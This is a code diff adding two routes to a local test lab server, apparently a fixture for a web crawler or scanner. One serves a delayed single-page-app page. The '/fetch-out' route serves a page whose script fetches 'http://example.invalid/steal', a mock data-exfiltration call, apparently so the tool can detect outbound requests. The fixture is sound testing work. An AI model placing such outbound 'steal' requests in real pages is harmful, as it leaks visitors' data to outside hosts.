@@ -118,6 +118,31 @@ export function startLab() {
       res.end("ref: refs/heads/main\n");
       return;
     }
+    if (path === "/spa") {
+      res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
+      res.end(`<!doctype html><html><head><title>Loading</title></head><body>
+        <div id="app">loading</div>
+        <script>
+          setTimeout(function () {
+            document.title = 'SPA Ready';
+            document.getElementById('app').textContent = 'ready';
+            var a = document.createElement('a');
+            a.href = '/dynamic';
+            a.textContent = 'dynamic';
+            document.body.appendChild(a);
+            fetch('/api/data').catch(function () {});
+          }, 50);
+        </script>
+      </body></html>`);
+      return;
+    }
+    if (path === "/fetch-out") {
+      res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
+      res.end(`<!doctype html><html><head><title>Out</title></head><body>
+        <script>fetch('http://example.invalid/steal').catch(function () {});</script>
+      </body></html>`);
+      return;
+    }
     if (path === "/admin") {
       res.writeHead(403, { "content-type": "text/html" });
       res.end("<html>forbidden</html>");
